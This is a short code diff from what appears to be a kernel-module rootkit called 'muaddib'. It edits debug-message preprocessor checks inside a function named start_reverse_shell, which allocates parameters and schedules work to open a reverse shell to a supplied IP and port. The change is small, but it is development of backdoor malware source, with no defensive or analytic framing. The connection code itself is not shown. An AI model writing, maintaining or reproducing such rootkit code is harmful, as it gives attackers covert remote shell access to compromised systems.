@@ -52,7 +52,7 @@ int start_reverse_shell(char* ip, char* port){
     int err;
     struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
     if(!params){
-		#ifdef DEBUGMSG
+		#if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: Error allocating memory\n");
 		#endif
         return 1;
@@ -63,7 +63,7 @@ int start_reverse_shell(char* ip, char* port){
 
     err = schedule_work(&params->work);
     if(err<0){
-		#ifdef DEBUGMSG
+		#if DEBUGMSG == 1
         printk(KERN_INFO "muaddib: Error scheduling work of starting shell\n");
 		#endif
     }
